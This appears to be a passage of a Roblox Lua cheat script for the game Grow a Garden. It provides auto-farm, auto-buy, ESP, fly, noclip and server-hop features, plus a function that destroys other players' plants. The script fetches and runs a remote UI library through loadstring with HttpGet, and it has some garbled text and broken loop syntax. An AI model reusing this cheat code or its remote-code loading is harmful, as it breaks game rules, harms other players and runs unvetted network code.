                            GuiService.SelectedObject = Button
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                        end
                    elseif holdingSeed then
                        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                        VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end

-- Server Hop Function
local function ServerHop()
    local servers = {}
    local cursor = nil
    repeat
        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor then url = url .. "&cursor=" .. cursor end
        local data = HttpService:JSONDecode(game:HttpGet(url))
        for _, server in ipairs(data.data) do
            table.insert(servers, server.id)
        end
        cursor = data.nextPageCursor
    until not cursor or #servers > 0
    if #servers == 0 then return end
    TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], lp)
end

-- Auto Plant Functions
local function getPlayerPosition()
    local char = lp.Character or lp.CharacterAdded:Wait()
    local root = char:FindFirstChild("HumanoidRootPart")
    return root and root.Position or Vector3.zero
end

local function getCurrentSeedsInBackpack()
    local result = {}
    for _, tool in ipairs(lp.Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local base = tool.Name:match("^(.-) Seed")
            if base and table.find(SelectedSeeds, base) then
                result[#result + 1] = {BaseName = base, Tool = tool}
            end
        end
    end
    return result
end

local function plantEquippedSeed(seedName)
    local pos = getPlayerPosition()
    plantRemote:FireServer(pos, seedName)
end

local function equipTool(tool)
    if not tool or not tool:IsDescendantOf(lp.Backpack) then return end
    pcall(function()
        lp.Character.Humanoid:UnequipTools()
        task.wait(0.1)
        tool.Parent = lp.Character
        while not lp.Character:FindFirstChild(tool.Name) do
            task.wait(0.1)
        end
    end)
end

local function startAutoPlanting()
    if CurrentlyPlanting then return end
    CurrentlyPlanting = true
    task.spawn(function()
        while AutoPlanting do
            local seeds = getCurrentSeedsInBackpack()
            for _, data in ipairs(seeds) do
                local tool = data.Tool
                local seedName = data.BaseName
                if not table.find(SelectedSeeds, seedName) then continue end
                if tool and tool:IsA("Tool") and tool:IsDescendantOf(lp.Backpack) then
                    equipTool(tool)
                    task.wait(0.2)
                    while AutoPlanting and lp.Character:FindFirstChild(tool.Name) do
                        if not table.find(SelectedSeeds, seedName) then break end
                        plantEquippedSeed(seedName)
                        task.wait(0.1)
                    end
                end
            end
            task.wait(0.1)
        end
        CurrentlyPlanting = false
    end)
end

-- Destroy Others Farm Function
local function DestroyOthersFarm()
    local farms = workspace:FindFirstChild("Farm")
    if not farms then return end
    for _, farm in pairs(farms:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value ~= lp.Name then
            local plants = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Plants_Physical")
            if plants then
                for _, obj in pairs(plants:GetChildren()) do
                    obj:Destroy()
                end
            end
        end
    end
end

-- ESP Functions
local function createESP(fruitModel)
    if state.espBillboards[fruitModel] then
        state.espBillboards[fruitModel]:Destroy()
        state.espBillboards[fruitModel] = nil
    end
    if state.espHighlights[fruitModel] then
        state.espHighlights[fruitModel]:Destroy()
        state.espHighlights[fruitModel] = nil
    end
    if not state.espEnabled then return end
    local activeMutations = {}
    for _, mutation in ipairs(mutationOptions) do
        if table.find(state.selectedMutations, mutation) and fruitModel:GetAttribute(mutation) then
            table.insert(activeMutations, mutation)
        end
    end
    if #activeMutations == 0 then return end
    local text = fruitModel.Name .. " - " .. table.concat(activeMutations, ", ")
    local espColor = mutationColors[activeMutations[1]] or Color3.fromRGB(255, 255, 255)
    local highlight = Instance.new("Highlight")
    highlight.Name = "MutationESP_Highlight"
    highlight.FillTransparency = 1
    highlight.OutlineColor = espColor
    highlight.OutlineTransparency = 0
    highlight.Adornee = fruitModel
    highlight.Parent = fruitModel
    state.espHighlights[fruitModel] = highlight
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "MutationESP"
    billboard.Adornee = fruitModel.PrimaryPart or fruitModel:FindFirstChildWhichIsA("BasePart")
    billboard.Size = UDim2.fromOffset(100, 20)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.AlwaysOnTop = true
    billboard.Enabled = true
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.fromScale(1, 1)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "{" .. text .. "}"
    textLabel.TextColor3 = espColor
    textLabel.TextScaled = true
    textLabel.TextStrokeTransparency = 0.5
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = billboard
    billboard.Parent = fruitModel
    state.espBillboards[fruitModel] = billboard
end

local function updateESP()
    for _, billboard in pairs(state.espBillboards) do
        billboard:Destroy()
    end
    for _, highlight in pairs(state.espHighlights) do
        highlight:Destroy()
    end
    table.clear(state.espBillboards)
    table.clear(state.espHighlights)
    if not state.espEnabled or not workspace:FindFirstChild("Farm") then return end
    local farms = {}
    for _, farm in ipairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    for _, farm in ipairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                            if fruitModel:IsA("Model") then
                                createESP(fruitModel)
                            end
                        end
                    end
                end
            end
        end
    end
end

local function updateMutationCounts()
    local mutationCounts = {}
    for _, mutation in pairs(mutationOptions) do
        mutationCounts[mutation] = 0
    end
    local farms = {}
    for _, farm in pairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    for _, farm in pairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in pairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in pairs(fruitsFolder:GetChildren()) do
                            if fruitModel:IsA("Model") then
                                local fruitId = fruitModel:GetFullName()
                                local mutationsFound = {}
                                for _, mutation in pairs(mutationOptions) do
                                    if fruitModel:GetAttribute(mutation) then
                                        mutationCounts[mutation] = mutationCounts[mutation] + 1
                                        table.insert(mutationsFound, mutation)
                                    end
                                end
                                if #mutationsFound > 0 and not notifiedFruits[fruitId] and state.espEnabled then
                                    notifiedFruits[fruitId] = true
                                    local plantName = plantModel.Name or "Unknown Plant"
                                    sendWebhookNotification(plantName, mutationsFound, lp.Name)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    local countText = ""
    for _, mutation in pairs(mutationOptions) do
        if mutationCounts[mutation] > 0 then
            countText = countText .. mutation .. ": " .. mutationCounts[mutation] .. ", "
        end
    end
    countText = countText:sub(1, -3)
    if countText == "" then countText = "No mutations found" end
    return countText
end

-- Table to track processed mutations (e.g., { [modelPath] = { mutation1 = true, mutation2 = true } })
local processedMutations = {}

-- Webhook Functions
local function sendWebhook(data)
    if not data or type(data) ~= "table" then return end
    local HttpService = game:GetService("HttpService")
    local json = HttpService:JSONEncode(data)
    local request = (syn and syn.request) or (http and http.request) or (http_request) or (request)
    if not request then return end
    local success, result = pcall(request, {
        Url = state.webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = json
    })
    if not success then
        warn("Failed to send webhook: " .. tostring(result))
        return false
    end
    if result and result.StatusCode and result.StatusCode >= 200 and result.StatusCode < 300 then
        print("Webhook sent successfully!")
        return true
    else
        warn("Webhook failed with status " .. tostring(result.StatusCode) .. ": " .. tostring(result.Body))
        return false
    end
end

local function sendWebhookNotification(fruitName, mutation, farmName)
    if state.webhookUrl == "" then return end

    local webhookData = {
        content = "",
        embeds = {
            {
                title = "ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€¦Ã¢â‚¬â„¢Ãƒâ€šÃ‚Â· Mutation Detected! ÃƒÆ’Ã‚Â°Ãƒâ€¦Ã‚Â¸Ãƒâ€¦Ã¢â‚¬â„¢Ãƒâ€šÃ‚Â·",
                description = string.format("A **%s** mutation was found!", mutation),
                color = 0x00FF00,
                fields = {
                    { name = "Fruit", value = fruitName or "Unknown", inline = true },
                    { name = "Farm", value = farmName or "Unknown", inline = true }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }

    return sendWebhook(webhookData)
end

-- Function to check farms and send notifications for new mutations
local function checkForMutations()
    if not workspace:FindFirstChild("Farm") or state.webhookUrl == "" or #state.selectedMutations == 0 then return end

    local farms = {}
    for _, farm in ipairs(workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end

    for _, farm in ipairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do plantModel:IsA("Model")
                local fruitsFolder = plantModel:FindFirstChild("Fruits")
                if fruitsFolder then
                    for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do fruitModel:IsA("Model")
                        -- Create a unique identifier for this fruit model (e.g., full path)
                        local modelPath = fruitModel:GetFullName()

                        -- Initialize processed mutations for this model if not exists
                        if not processedMutations[modelPath] then
                            processedMutations[modelPath] = {}
                        end

                        -- Check for selected mutations
                        for _, mutation in ipairs(state.selectedMutations) do
                            if fruitModel:GetAttribute(mutation) == true then
                                -- Check if this mutation was already processed
                                if not processedMutations[modelPath][mutation] then
                                    -- Mark as processed
                                    processedMutations[modelPath][mutation] = true
                                    -- Send webhook notification for new mutation
                                    sendWebhookNotification(
                                        plantModel.Name,
                                        mutation,
                                        farm.Name
                                    )
                                    -- Optional: Add a short delay to avoid rate limits
                                    wait(0.5) -- Adjust based on Discord's rate limit (e.g., 30 req/min)
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    -- Optional: Clean up processed mutations for models that no longer exist
    for modelPath in pairs(processedMutations) do
        if not game:GetService("Workspace"):FindFirstChild(modelPath) then
            processedMutations[modelPath] = nil
        end
    end
end

-- UI Setup
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Grow a Garden | PolleserHub",
    Icon = 0,
    LoadingTitle = "Grow a Garden | PolleserHub",
    LoadingSubtitle = "by Polleser",
    Theme = "Ocean",
    ConfigurationSaving = { Enabled = true, FolderName = nil, FileName = "Polleser Hub" },
    Discord = { Enabled = true, Invite = "dmBzVaRrD3", RememberJoins = true },
    KeySystem = false,
    KeySettings = {
        Title = "Polleser Hub Key System",
        Subtitle = "Hello.",
        Note = "To get the Script's Key you need to join our Discord server, the link is already copied.",
        FileName = "PolleserHub Key",
        SaveKey = true,
        GrabKeyFromSite = true,
        KeyFile = "",
        Key = {
            "areyouseriousrnbroisthisevenakey", "", "", "", 
            "", "", "", "", 
            "", "", "", "", 
            "", "", "", "", 
            "", "", "", "", 
            "", "", ""
        }
    }
})

-- Tabs
local MainTab = Window:CreateTab("Main", "star")
local ShopTab = Window:CreateTab("Shop", "shopping-cart")
local PlayerTab = Window:CreateTab("Players", "user")
local MiscTab = Window:CreateTab("Miscellaneous", "list")
local SpawnerTab = Window:CreateTab("Spawner", "paw-print")
local VisualsTab = Window:CreateTab("Visuals", "eye")

-- Main Tab
MainTab:CreateSection("Auto Farm")
MainTab:CreateToggle({ Name = "Auto Farm", CurrentValue = false, Callback = function(state) autoFarmEnabled = state if state then instantFarm() else if farmThread then task.cancel(farmThread) farmThread = nil end end end })
MainTab:CreateToggle({ Name = "Auto Farm v2", Info = "Make sure you look down! May not collect sometimes. Bad for packed areas!", CurrentValue = false, Callback = ToggleHarvest })
MainTab:CreateToggle({ Name = "Auto Collect", CurrentValue = false, Callback = function(state) fastClickEnabled = state if state then fastClickFarm() else if fastClickThread then task.cancel(fastClickThread) fastClickThread = nil end end end })
MainTab:CreateToggle({ Name = "Auto Collect V2", Info = "Automatically collects fruits near you", CurrentValue = false, Callback = function(Value)
    spamE = Value
    updateFarmData()
    for _, farm in pairs(farms) do for _, obj in ipairs(farm:GetDescendants()) do if obj:IsA("ProximityPrompt") then handleNewPrompt(obj) end end end
    if spamE then
        collectionThread = task.spawn(function()
            while spamE and task.wait(0.1) do
                if not isInventoryFull() then
                    local char = lp.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    if root then
                        for prompt, _ in pairs(promptTracker) do
                            if prompt:IsA("ProximityPrompt") and prompt.Enabled and prompt.KeyboardKeyCode == Enum.KeyCode.E then
                                local targetPos
                                local parent = prompt.Parent
                                if parent:IsA("BasePart") then targetPos = parent.Position
                                elseif parent:IsA("Model") and parent:FindFirstChild("HumanoidRootPart") then targetPos = parent.HumanoidRootPart.Position end
                                if targetPos and (root.Position - targetPos).Magnitude <= RANGE then pcall(function() fireproximityprompt(prompt, 1, true) end) end
                            end
                        end
                    end
                end
            end
        end)
    else
        for prompt, data in pairs(promptTracker) do if prompt:IsA("ProximityPrompt") then pcall(function() prompt.RequiresLineOfSight = data.originalRequiresLOS prompt.Exclusivity = data.originalExclusivity end) end end
        if collectionThread then task.cancel(collectionThread) collectionThread = nil end
    end
end })
descendantConnection = workspace.DescendantAdded:Connect(function(obj) if obj:IsA("ProximityPrompt") and isInsideFarm(obj) then handleNewPrompt(obj) end end)
MainTab:CreateToggle({ Name = "Auto Sell", Info = "Automatically sells when inventory is full (200)", CurrentValue = false, Callback = function(Value)
    autoSellEnabled = Value
    if autoSellEnabled then
        autoSellThread = task.spawn(function() while autoSellEnabled and task.wait(1) do if isInventoryFull() then sellItems() end end end)
    elseif autoSellThread then task.cancel(autoSellThread) end
end })

MainTab:CreateSection("Honey Event")
MainTab:CreateToggle({ Name = "Auto Farm Pollinated", CurrentValue = false, Callback = function(state) autoFarmEnabled = state if state then instantFarmPollinated() else if farmThread then task.cancel(farmThread) farmThread = nil end end end })

MainTab:CreateToggle({
    Name = "Auto Collect",
    Info = "Automatically collects fruits near you",
    CurrentValue = false,
    Callback = function(Value)
        spamE = Value
        updateFarmData()
        for _, farm in pairs(farms) do
            for _, obj in ipairs(farm:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    local model = obj.Parent:FindFirstAncestorOfClass("Model")
                    if model and model:GetAttribute("Pollinated") == true then
                        handleNewPrompt(obj)
                    end
                end
            end
        end
        if spamE then
            collectionThread = task.spawn(function()
                while spamE and task.wait(0.1) do
                    if not isInventoryFull() then
                        local char = lp.Character
                        local root = char and char:FindFirstChild("HumanoidRootPart")
                        if root then
                            for prompt, _ in pairs(promptTracker) do
                                if prompt:IsA("ProximityPrompt") and prompt.Enabled and prompt.KeyboardKeyCode == Enum.KeyCode.E then
                                    local model = prompt.Parent:FindFirstAncestorOfClass("Model")
                                    if model and model:GetAttribute("Pollinated") == true then
                                        local targetPos
                                        local parent = prompt.Parent
                                        if parent:IsA("BasePart") then
                                            targetPos = parent.Position
                                        elseif parent:IsA("Model") and parent:FindFirstChild("HumanoidRootPart") then
                                            targetPos = parent.HumanoidRootPart.Position
                                        end
                                        if targetPos and (root.Position - targetPos).Magnitude <= RANGE then
                                            pcall(function() fireproximityprompt(prompt, 1, true) end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end)
        else
            for prompt, data in pairs(promptTracker) do
                if prompt:IsA("ProximityPrompt") then
                    pcall(function()
                        prompt.RequiresLineOfSight = data.originalRequiresLOS
                        prompt.Exclusivity = data.originalExclusivity
                    end)
                end
            end
            if collectionThread then
                task.cancel(collectionThread)
                collectionThread = nil
            end
        end
    end
})

descendantConnection = workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("ProximityPrompt") and isInsideFarm(obj) then
        local model = obj.Parent:FindFirstAncestorOfClass("Model")
        if model and model:GetAttribute("Pollinated") == true then
            handleNewPrompt(obj)
        end
    end
end)

MainTab:CreateSection("Exclude Mutations or Fruits")

local ignoredMutations = {"Celestial"} -- Table to store selected mutations to ignore
local ignoreMutationsEnabled = false -- Toggle for ignoring mutations
local allPromptsDisabled = false -- Toggle for disabling all prompts

-- Function to update ProximityPrompts for a single fruit
local function updateFruitPrompts(fruitModel)
    if not fruitModel:IsA("Model") then return end
    for _, obj in ipairs(fruitModel:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            local shouldDisable = allPromptsDisabled
            if not allPromptsDisabled and ignoreMutationsEnabled then
                for _, mutation in ipairs(ignoredMutations) do
                    if fruitModel:GetAttribute(mutation) == true then
                        shouldDisable = true
                        break
                    end
                end
            end
            obj.Enabled = not shouldDisable
        end
    end
end

-- Function to update all ProximityPrompts in owned farms
local function updatePromptsForMutations()
    local farms = {}
    if not Workspace:FindFirstChild("Farm") then return end
    
    for _, farm in ipairs(Workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            table.insert(farms, farm)
        end
    end
    
    for _, farm in ipairs(farms) do
        local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
        if plantsFolder then
            for _, plantModel in ipairs(plantsFolder:GetChildren()) do
                if plantModel:IsA("Model") then
                    local fruitsFolder = plantModel:FindFirstChild("Fruits")
                    if fruitsFolder then
                        for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                            updateFruitPrompts(fruitModel)
                        end
                    end
                end
            end
        end
    end
end

-- Monitor new fruits being added
local function setupFruitMonitoring()
    if not Workspace:FindFirstChild("Farm") then return end
    for _, farm in ipairs(Workspace.Farm:GetChildren()) do
        local data = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            local plantsFolder = farm.Important:FindFirstChild("Plants_Physical")
            if plantsFolder then
                plantsFolder.ChildAdded:Connect(function(plantModel)
                    if plantModel:IsA("Model") then
                        local fruitsFolder = plantModel:WaitForChild("Fruits", 5)
                        if fruitsFolder then
                            fruitsFolder.ChildAdded:Connect(function(fruitModel)
                                updateFruitPrompts(fruitModel)
                            end)
                            -- Update existing fruits in the new plant
                            for _, fruitModel in ipairs(fruitsFolder:GetChildren()) do
                                updateFruitPrompts(fruitModel)
                            end
                        end
                    end
                end)
            end
        end
    end
end

-- Initialize monitoring
setupFruitMonitoring()

-- Re-run monitoring setup when Farm or its children change
Workspace.Farm.ChildAdded:Connect(function()
    setupFruitMonitoring()
end)

-- Dropdown for selecting mutations to ignore
MainTab:CreateDropdown({
    Name = "Exclude Mutations In Collecting",
    Options = mutationOptions, -- Assumes mutationOptions is defined
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "ExcludeMut",
    Callback = function(selectedOptions)
        ignoredMutations = selectedOptions
        updatePromptsForMutations()
    end
})

-- Toggle for ignoring selected mutations
MainTab:CreateToggle({
    Name = "Ignore Selected Mutations",
    CurrentValue = false,
    Callback = function(state)
        ignoreMutationsEnabled = state
        updatePromptsForMutations()
    end
})

-- Toggle for ignoring all plants
MainTab:CreateToggle({
    Name = "Ignore Every Plant (for mobile or pc idk)",
    CurrentValue = false,
    Callback = function(state)
        allPromptsDisabled = state
        updatePromptsForMutations()
    end
})
MainTab:CreateSection("Insta Sell")
MainTab:CreateButton({ Name = "Insta Sell", Callback = SellAll })
MainTab:CreateButton({ Name = "Insta Sell Hand", Callback = HSell })
MainTab:CreateButton({
    Name = "Sell Pets",
    Info = "Sells all eligible pets in your backpack that are not favorited",
    Callback = function()
        local p = lp
        local b = p:WaitForChild("Backpack")
        local c = p.Character or p.CharacterAdded:Wait()
        local pets = {}
        for _, t in ipairs(b:GetChildren()) do
            if t:IsA("Tool") and t:FindFirstChild("PetToolLocal") and string.match(t.Name, "%[Age%s%d+%]") then
                if t:GetAttribute("Favorite") ~= true then
                    t.Parent = c
                    table.insert(pets, t)
                end
            end
        end
        c:PivotTo(CFrame.new(62, 3, 0))
        task.wait(0.3)
        local e = GameEvents:WaitForChild("SellPet_RE")
        for _, t in ipairs(pets) do 
            if t and t:IsDescendantOf(c) then 
                e:FireServer(t) 
            end 
        end
        Rayfield:Notify({
            Title = "Pet Seller",
            Content = "Pet selling process completed! Favorited pets were skipped.",
            Duration = 3,
            Actions = {
                Ignore = {
                    Name = "OK",
                    Callback = function() end
                }
            }
        })
    end
})
MainTab:CreateSection("Others")
MainTab:CreateDropdown({ Name = "Select Mutations(Auto Fav)", Options = mutationOptions, CurrentOption = selectedMutations, MultipleOptions = true, Flag = "AutoFavvv", Callback = function(Options) selectedMutations = Options if autoFavoriteEnabled then processBackpack() end end })
MainTab:CreateToggle({ Name = "Auto-Favorite", CurrentValue = false, Callback = function(Value) autoFavoriteEnabled = Value if Value then setupAutoFavorite() elseif connection then connection:Disconnect() connection = nil end end })
MainTab:CreateButton({ Name = "Unfav all", Callback = function() local backpack = lp:WaitForChild("Backpack") for _, tool in ipairs(backpack:GetChildren()) do local isFavorited = tool:GetAttribute("Favorite") or (tool:FindFirstChild("Favorite") and tool.Favorite.Value) if isFavorited then favoriteEvent:FireServer(tool) task.wait() end end end })
MainTab:CreateToggle({ Name = "One Click Plant Remove", Info = "Be careful! Hope you don't delete something you needed!", CurrentValue = false, Callback = OneClickRemove })
MainTab:CreateButton({ Name = "Stop Grow-ALL Pop-up", Callback = DestroySign })

-- Shop Tab
ShopTab:CreateSection("Auto Buy")
ShopTab:CreateDropdown({
    Name = "Select Seeds",
    Info = "Choose which seeds to auto buy",
    Options = seedItems,
    CurrentOption = selectedSeeds,
    MultipleOptions = true,
    Flag = "SelectSeds",
    Callback = function(Options) selectedSeeds = Options end
})
ShopTab:CreateDropdown({
    Name = "Select Gear",
    Info = "Choose which gear to auto buy",
    Options = gearItems,
    CurrentOption = selectedGears,
    MultipleOptions = true,
    Flag = "SelectGers",
    Callback = function(Options) selectedGears = Options end
})
ShopTab:CreateDropdown({
    Name = "Select Honey",
    Info = "Choose which gear to auto buy",
    Options = honeyItems,
    CurrentOption = selectedHoney,
    MultipleOptions = true,
    Flag = "SelectHoney",
    Callback = function(Options) selectedHoney = Options end
})
ShopTab:CreateToggle({
    Name = "Auto Buy (Seed & Gear)",
    CurrentValue = false,
    Callback = function(Value)
        autoBuyEnabled = Value
        if autoBuyEnabled then
            spawn(function()
                while autoBuyEnabled do
                    for _, seed in ipairs(selectedSeeds) do
                        if not autoBuyEnabled then break end
                        seedRemote:FireServer(seed)
                    end
                    for _, gear in ipairs(selectedGears) do
                        if not autoBuyEnabled then break end
                        gearRemote:FireServer(gear)
                    end
                    wait(1.5)
                end
            end)
        end
    end
})
ShopTab:CreateToggle({
    Name = "Auto Buy Honey",
    CurrentValue = false,
    Callback = function(Value)
        autoBuyEnabled = Value
        if autoBuyEnabled then
            spawn(function()
                while autoBuyEnabled do
                    -- Auto buy selected twilight
                    for _, honey in ipairs(selectedHoney) do
                        if autoBuyEnabled then
                            honeyRemote:FireServer(honey)
                            wait(1.5) -- 0.1 second delay
                        end
                    end
                end
            end)
        end
    end
})
ShopTab:CreateToggle({ Name = "Auto Buy Eggs", CurrentValue = false, Callback = function(value) Autoegg_autoBuyEnabled = value if Autoegg_autoBuyEnabled then Autoegg_firstRun = true Autoegg_autoBuyEggs() end end })

ShopTab:CreateSection("Event")

local maxWeight = nil

-- Create the Input for max weight
local WeightInput = ShopTab:CreateInput({
    Name = "Max Weight",
    Info = "Enter the maximum Weight value for tools (leave blank to ignore)",
    PlaceholderText = "e.g. 10",
    Callback = function(Value)
        -- Convert input to number or set to nil if empty/invalid
        if Value == "" then
            maxWeight = nil
        else
            local num = tonumber(Value)
            maxWeight = num and num > 0 and num or nil -- Only set if valid positive number
        end
    end,
})

-- Modified AutoGiveHoney function
local function AutoGiveSummer(state)
    AaA = state
    task.spawn(function()
        while AaA do
            local lp = game:GetService("Players").LocalPlayer
            local backpack = lp:FindFirstChild("Backpack")
            local character = lp.Character or lp.CharacterAdded:Wait()
            if backpack and character then
                for _, tool in pairs(backpack:GetChildren()) do
                    -- Get the ItemName attribute and Weight value
                    local itemName = tool:GetAttribute("f")
                    local weightInstance = tool:FindFirstChild("Weight")
                    local toolWeight = weightInstance and weightInstance:IsA("NumberValue") and weightInstance.Value or nil
                    if tool:IsA("Tool") 
                        and table.find(seedItems, itemName) 
                        and (maxWeight == nil or (toolWeight and toolWeight <= maxWeight)) then
                        tool.Parent = character -- Equip the tool
                        task.wait(0.1)
                        for _ = 1, 30 do
                            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SummerHarvestRemoteEvent"):FireServer("SubmitHeldPlant")
                        end
                        task.wait(0.1)
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end

-- Create a Toggle to enable/disable the AutoGiveHoney function
local Toggle = ShopTab:CreateToggle({
    Name = "Auto Summer",
    CurrentValue = false,
    Callback = function(Value)
        AutoGiveSummer(Value) -- Start or stop the function based on toggle state
    end,
})
local asdd = false
ShopTab:CreateToggle({
    Name = "Spams Summer Interact(For Collecting your Summer Stuff Not In Your Garden But Event)",
    Callback = function()
        asdf = not asdd
        if asdf then
            spawn(function()
                while asdf do
                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SummerHarvestRemoteEvent"):FireServer("SubmitHeldPlant")
                    wait(2)
                end
            end)
        end
    end
})
ShopTab:CreateButton({
    Name = "Summer Interact Event", 
    Callback = function()
        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("SummerHarvestRemoteEvent"):FireServer("SubmitHeldPlant")
    end
})
local TeleportButton2 =
    ShopTab:CreateButton(
    {
        Name = "Teleport to Event",
        Callback = function()
            local player = Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100, 4, -12))
            else
                warn("Character or HumanoidRootPart not found.")
            end
        end
    }
)
local Tpbutton =
    ShopTab:CreateButton(
    {
        Name = "Teleport to Crafting & Honey",
        Callback = function()
            local player = Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-282, 3, -48))
            else
                warn("Character or HumanoidRootPart not found.")
            end
        end
    }
)


ShopTab:CreateSection("Cosmetic")
ShopTab:CreateButton({ Name = "Open Cosmetic Shop", Callback = OpenCosmetic })
ShopTab:CreateButton({Name="Buy Cosmetic Items x5 (In Stock it'll also drains your shuckles)",Callback=function()for _,s in ipairs({lp.PlayerGui.CosmeticShop_UI.CosmeticShop.Main.Holder.Shop.ContentFrame.TopSegment,lp.PlayerGui.CosmeticShop_UI.CosmeticShop.Main.Holder.Shop.ContentFrame.BottomSegment})do for _=1,5 do for _,f in ipairs(s:GetChildren())do if f:IsA("Frame")then GameEvents.BuyCosmeticItem:FireServer(f.Name)if f.Name:find("Crate")then GameEvents.BuyCosmeticCrate:FireServer(f.Name)end end end end end end})
local TeleportButton =
    ShopTab:CreateButton(
    {
        Name = "Teleport to Cosmetic",
        Callback = function()
            local player = Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-287, 3, -15))
            else
                warn("Character or HumanoidRootPart not found.")
            end
        end
    }
)
ShopTab:CreateSection("Events")
ShopTab:CreateButton({ Name = "Open Honey Shop", Info = "Click again to close", Callback = OpenHoney })
ShopTab:CreateSection("Menus")
ShopTab:CreateButton({ Name = "Open Egg Shop 1", Info = "Click again to close", Callback = EggShop1 })
ShopTab:CreateButton({ Name = "Open Egg Shop 2", Info = "Click again to close", Callback = EggShop2 })
ShopTab:CreateButton({ Name = "Open Egg Shop 3", Info = "Click again to close", Callback = EggShop3 })
ShopTab:CreateButton({ Name = "Open Seed Shop", Info = "Click again to close", Callback = OpenShop })
ShopTab:CreateButton({ Name = "Open Gear Shop", Info = "Click again to close", Callback = OpenGearShop })
ShopTab:CreateButton({ Name = "Open Quest", Info = "Click again to close", Callback = OpenQuest })

-- Player Tab
PlayerTab:CreateSection("Movement")
PlayerTab:CreateToggle({ Name = "Fly", CurrentValue = false, Callback = Fly })
PlayerTab:CreateToggle({ Name = "No Clip", CurrentValue = false, Callback = ToggleNoclip })
PlayerTab:CreateToggle({ Name = "Infinite Jump", CurrentValue = false, Callback = ToggleInfJump })
PlayerTab:CreateSlider({ Name = "Player Speed", Range = {0, 200}, Increment = 4, Suffix = "Speed", CurrentValue = 16, Callback = function(value) local char = lp.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").WalkSpeed = value end end })
PlayerTab:CreateSlider({ Name = "Jump Height", Range = {0, 200}, Increment = 10, Suffix = "Height", CurrentValue = 50, Callback = function(value) local char = lp.Character if char and char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid").JumpPower = value end end})

MiscTab:CreateSection("Plants")
MiscTab:CreateDropdown({ Name = "Select Seeds to Plant", Info = "Seeds to plant", Options = seedNames, CurrentOption = {}, MultipleOptions = true, Flag = "SelectPlantFr", Callback = function(opts) SelectedSeeds = opts end })
